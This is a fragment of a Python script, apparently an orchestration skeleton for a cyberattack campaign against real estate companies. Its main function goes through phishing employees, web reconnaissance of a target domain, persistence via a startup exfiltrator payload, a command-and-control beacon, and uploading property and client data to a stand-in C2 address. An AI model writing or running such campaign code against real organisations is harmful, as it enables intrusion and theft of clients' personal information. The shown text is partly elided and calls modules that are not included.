...
def main():
    """
    Main function to run the real_estate_company_campaign campaign.
    """
    print(f"[*] Starting real_estate_company_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("real_estate_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target real_estate_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/property_data_and_client_information_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-REAL_ESTATE_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("property_data_and_client_information/property_data_and_client_information.zip", "https://c2.example.com/upload")
    run_tool("payloads/property_data_and_client_information_exfiltrator.py")
